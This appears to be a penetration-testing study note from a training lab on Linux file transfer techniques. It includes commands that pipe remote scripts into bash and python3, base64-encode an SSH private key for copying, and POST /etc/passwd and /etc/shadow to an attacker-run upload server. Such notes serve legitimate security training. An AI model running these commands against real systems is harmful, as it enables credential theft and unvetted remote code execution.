# **Download Operations**
---
# Base64 Encoding / Decoding
---
- Encode SSH Key to Base64:
	- `cat id_rsa |base64 -w 0;echo`
- We copy this content and decode:
	- `echo -n 'copied_content' | base64 -d` > id_rsa
- Confirm the MD5 Hashes Match:
	- `md5sum id_rsa`

# Web Downloads with Wget and cURL
---
- `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh`
- `curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`

# Fileless Attacks Using Linux
---
**Note:** Some payloads s**uch as `mkfifo` write files to disk.** Keep in mind that while the **execution of the payload may be fileless** when you use a pipe, depending on the payload chosen it **==may create temporary files on the OS.==**

- Fileless Download with cURL:
	- `curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash`
- Fileless Download with wget:
	- `wget -qO- https://raw.githubusercontent.com/juliourena/plaintext/master/Scripts/helloworld.py | python3`

# Download with Bash (/dev/tcp)
---
- Connect to the Target Webserver:
	- `exec 3<>/dev/tcp/10.10.10.32/80`
- HTTP GET Request:
	- `echo -e "GET /LinEnum.sh HTTP/1.1\n\n">&3`
- Print the Response:
	- `cat <&3`

# SSH Downloads
---
- Starting the SSH Server:
	- `sudo systemctl start ssh`
- `scp plaintext@192.168.49.128:/root/myroot.txt . `

# **Upload Operations**
---
# Web Upload - Using HTTPS (HTTP was covered in [[Windows File Transfer Methods]])
---
-  Create a Self-Signed Certificate:
	  `openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'`
- Start Web Server:
	  `python3 -m uploadserver 443 --server-certificate ~/server.pem`
- Upload Multiple Files:
	  `curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure`

# Alternative Web File Transfer Method
---
- Since Linux distributions usually have `Python` or `php` installed, starting a web server to transfer files is straightforward.

-  Creating a Web Server with Python3:
	- `python3 -m http.server`
	- `python2.7 -m SimpleHTTPServer`
- Creating a Web Server with PHP:
	- `php -S 0.0.0.0:8000`
- Creating a Web Server with Ruby:
	- `ruby -run -ehttpd . -p8000`
- Download the File from the Target Machine:
	- `wget 192.168.49.128:8000/filetotransfer.txt`

# SCP Upload
---
- `scp /etc/passwd htb-student@10.129.86.90:/home/htb-student/`